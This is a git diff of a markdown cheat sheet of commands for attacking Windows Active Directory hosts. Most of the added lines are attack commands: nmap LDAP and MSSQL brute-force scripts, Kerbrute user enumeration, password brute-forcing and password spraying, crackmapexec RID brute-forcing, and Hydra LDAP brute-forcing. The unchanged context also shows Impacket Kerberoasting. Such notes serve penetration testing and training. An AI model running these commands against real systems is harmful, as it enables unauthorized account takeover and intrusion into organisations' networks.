@@ -1,8 +1,14 @@
-## Commands and Techniques to do recon on windows hosts (some of these techniques generate lot of noise so use them sparingly)
+## Commands and Techniques to do recon on windows hosts 
+note1: some of these techniques generate lot of noise so use them sparingly.
+note2: some of these techniques depends of the ports are open in the host.
 
 ### 1 - nmap
 
-* ``` $ nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=’<domain>’,userdb=/root/Desktop/usernames.txt <IP> ``` 
+* ``` $ nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=’<domain>’,userdb=usernames <IP> ```
+
+* ``` $ nmap -vv -p 389 --script ldap-brute --script-args ldap.base='"cn=users,dc=ad,dc=domain"' <IP> ```
+
+* ``` $ nmap -vv -p 1433 --script ms-sql-brute --script-args userdb=usernames,passdb=wordlist.txt <IP> ```
 
 ### 2 - SMB
 
@@ -43,9 +49,16 @@
 * ``` msf > use Auxiliary/gather/Kerberos_enumusers ```
 
 
-### 6 - enum user with Kerbrute
+### 6 - Kerbrute
 
+* Enum user
 * ``` $ ./kerbrute userenum --dc <IP>  -d ad.domain /path/to/wordlist ```
+
+* Passwors brute
+* ``` $ ./kerbrute bruteuser -d ad.domain --dc <IP> wordlist.txt username ```  
+
+* Password spray
+* ``` $ ./kerbrute passwordspray -d ad.domain --dc <IP> usernames.txt Password123 ```
 
 
 ### 7 - Impacket scripts
@@ -60,6 +73,19 @@
 * ``` $ impacket-GetUserSPN  -dc-ip <IP> <ad.domain>/<user>:<pass> -request ```
 
 
-### 8 - ldapsearch
+### 8 crackmapexec
+
+* Enumerate users by bruteforcing the RID
+* ``` $ crackmapexec smb <IP> -u "anonymous" -p "" --rid-brute ```
+
+* Password brute
+* ``` $ crackmapexec ldap <IP> -u <username or userlist> -p wordlist.txt ```
+
+### 9 - Hydra
+
+* Password brute
+* ``` $ hydra -v -l username -P wordlist.txt <IP> ldap2 ```
+
+### 10 - ldapsearch
 
 ...
